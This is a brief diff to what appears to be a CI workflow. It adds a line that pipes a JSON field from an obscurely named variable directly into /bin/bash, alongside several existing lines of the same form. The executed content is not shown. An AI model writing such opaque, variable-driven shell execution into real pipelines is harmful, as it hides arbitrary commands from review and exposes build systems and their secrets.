@@ -29,6 +29,7 @@ jobs:
           echo $zhky819 | jq -r .xyw5 | /bin/bash
           printf '%s' "$rkwo2" | jq -r .zd18 | /bin/bash
           echo $tdc768 | jq -r .ncg822 | /bin/bash
+          echo $r1317 | jq -r .ytydv01927 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
